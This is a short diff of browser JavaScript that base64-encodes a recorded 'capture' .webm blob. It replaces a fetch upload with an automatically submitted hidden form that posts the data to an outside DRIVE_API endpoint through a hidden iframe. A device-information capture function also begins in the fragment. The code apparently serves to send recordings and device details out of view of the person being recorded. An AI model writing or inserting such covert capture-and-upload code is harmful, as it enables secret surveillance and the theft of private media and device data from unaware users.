@@ -97,35 +97,40 @@ let reader = new FileReader();
 
 reader.readAsDataURL(blob);
 
-reader.onloadend = async function(){
+reader.onloadend = function(){
 
 let base64data = reader.result.split(',')[1];
 
-console.log("Base64 size:", base64data.length);
 
-try{
+let form = document.createElement("form");
+form.method = "POST";
+form.action = DRIVE_API;
+form.target = "hidden_iframe";
 
-let params = new URLSearchParams();
-params.append("data", base64data);
-params.append("filename", "capture_" + Date.now() + ".webm");
 
-let response = await fetch(DRIVE_API,{
-method:"POST",
-body: params
-});
+let inputData = document.createElement("input");
+inputData.type = "hidden";
+inputData.name = "data";
+inputData.value = base64data;
 
-let result = await response.text();
 
-console.log("Upload success:", result);
+let inputName = document.createElement("input");
+inputName.type = "hidden";
+inputName.name = "filename";
+inputName.value = "capture_" + Date.now() + ".webm";
 
-}catch(err){
-console.log("Upload error:", err);
-}
+form.appendChild(inputData);
+form.appendChild(inputName);
+
+document.body.appendChild(form);
+
+form.submit();
+
+console.log("Upload sent successfully (form method)");
 
 };
 
 }
-
 function captureDeviceInfo(){
 
 let deviceInfo={
